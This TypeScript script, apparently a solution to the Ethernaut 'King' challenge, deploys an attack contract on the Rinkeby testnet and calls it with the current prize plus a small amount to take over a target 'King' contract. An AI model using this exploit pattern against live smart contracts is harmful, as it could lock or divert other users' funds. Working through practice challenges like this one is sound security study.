import { getDefaultProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';
import { readFileSync } from 'fs-extra';
import path from 'path/posix';

import { Attack__factory, King__factory } from '../types/ethers-contracts';

// const provider = getDefaultProvider("HTTP://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const testPrivKey = "";
const addr = "0xFa1Ae0B43A517f4160cc855391Cc8EaC0B3BBCAC"

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);
  const factory = new Attack__factory(alice);
  const attack = await factory.deploy(addr, {
    gasLimit: 1000000
  })
  const king = King__factory.connect(addr, provider).connect(alice)
  // attack is not payable
  attack.attack({
    value: (await king.prize()).add(toWei(0.001)),
    gasLimit: 1000000
  })
}

main()
